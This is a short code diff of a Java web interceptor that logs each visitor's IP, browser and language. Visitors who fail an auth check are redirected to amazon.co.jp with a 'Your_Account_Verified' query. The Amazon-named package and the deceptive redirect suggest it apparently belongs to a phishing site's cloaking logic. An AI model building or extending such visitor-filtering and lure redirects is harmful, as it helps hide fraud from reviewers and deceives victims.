@@ -1,7 +1,6 @@
 package com.kidd.amazon.interceptor;
 
 import cn.hutool.core.date.DateUtil;
-import com.alibaba.fastjson.JSON;
 import com.kidd.amazon.common.IpUtils;
 import com.kidd.amazon.service.AuthUserService;
 import com.kidd.amazon.task.AsyncTask;
@@ -45,7 +44,7 @@ public class SessionInfoInterceptor implements HandlerInterceptor {
         //ip
         String ip = IpUtils.getIpAddress(request);
         String ul = request.getHeader("Accept-Language");
-        String ua = request.getHeader("User-Agent");
+        String uaStr = request.getHeader("User-Agent");
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String dateTime = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
         HttpSession session = request.getSession();
@@ -53,17 +52,17 @@ public class SessionInfoInterceptor implements HandlerInterceptor {
         if(null == userInfoMap){
             userInfoMap = new LinkedHashMap<>();
         }
-        userInfoMap.put("UserAgent", ua);
-        userInfoMap.put("DateTime", dateTime);
+        userInfoMap.put("UserAgent", uaStr);
         userInfoMap.put("Ip", IpUtils.getIpAddress(request));
+        //userInfoMap.put("DateTime", dateTime);
         //userInfoMap.put("Al", ul);
         session.setAttribute("userInfo",userInfoMap);
         Boolean authBool =  authUserService.auth(request);
+        asyncTask.asyncWriteAccessLog(request,ip,null,null,dateTime,authBool,uaStr,ul);
         if(authBool){
-            //asyncTask.asyncWriteAccessLog(request,ip,null,null,dateTime);
             return true;
         }
-        response.sendRedirect("https://en.wikipedia.org/");
+        response.sendRedirect("https://amazon.co.jp/?Your_Account_Verified");
         return false;
     }
 }
